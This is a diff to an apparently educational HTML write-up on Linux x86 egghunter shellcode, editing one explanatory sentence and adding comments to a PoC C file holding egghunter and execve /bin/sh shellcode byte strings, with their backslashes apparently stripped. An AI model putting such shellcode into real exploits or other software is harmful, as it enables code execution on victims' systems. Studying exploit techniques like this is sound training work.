@@ -21,7 +21,7 @@ Summing up, the first part of shellcode will be responsible for searching our 4-
 <br>
 Knowing this, the first part is the most important and the one which must be researched carefully. There are many "egghunters" on the internet, but in this case we will focus our study in the ones shown in <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">the Skape's paper from 2004</a>.<br>
 <br>
-These egghunters have the three requirements needed: robustness, small size and they are fast. In all of them the author uses 8-byte "eggs", which means that the tag is used twice, so . The technique is based on the system calls, given they can <i>validate process-relative memory addresses without leading to a segmentation fault or other runtime error in the program itself</i>, using them to check if the memory is readable and later if the tag has been reached.<br>
+These egghunters have the three requirements needed: robustness, small size and they are fast. In all of them the author uses 8-byte "eggs", which means that the tag is used twice. The technique is based on the system calls, given they can <i>validate process-relative memory addresses without leading to a segmentation fault or other runtime error in the program itself</i>, using them to check if the memory is readable and later if the tag has been reached.<br>
 <br>
 <br>
 <h2> EggHunter study</h2><br>
@@ -105,13 +105,16 @@ Finally, it is tested with the "execve" shellcode as payload:<br>
 <img src="visual/images/slae/3/3.png"><br>
 <br><br>
 <h3> PoC code</h3>
-This is the code of <i>shellcode.c</i> for this exercise:
+This is the code of <i>shellcode.c</i> for this exercise. As it can be seen, the payload can be easily configured:
 <br><br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">
 #include <stdio.h><br>
 #include <string.h><br>
+// TAG or EGG is defined in here<br>
 #define egg "x90x50x90x50"<br>
 <br>
+// unsigned char egghunter[] = EGGHUNTER<br>
 unsigned char egghunter[] = "x31xd2x66x81xcaxffx0fx42x8dx5ax04x6ax21x58xcdx80x3cxf2x74xeexb8x90x50x90x50x89xd7xafx75xe9xafx75xe6xffxe7";<br>
+// unsigned char shellcode[] = egg egg PAYLOAD<br>
 unsigned char shellcode[] = egg egg "x31xc0x31xdbx31xc9x31xd2x50x68x6ex2fx73x68x68x2fx2fx62x69x68x2fx2fx2fx2fx89xe3x50x89xe2x53x89xe1xb0x0bxcdx80";<br>
 <br>
 int main() {<br>
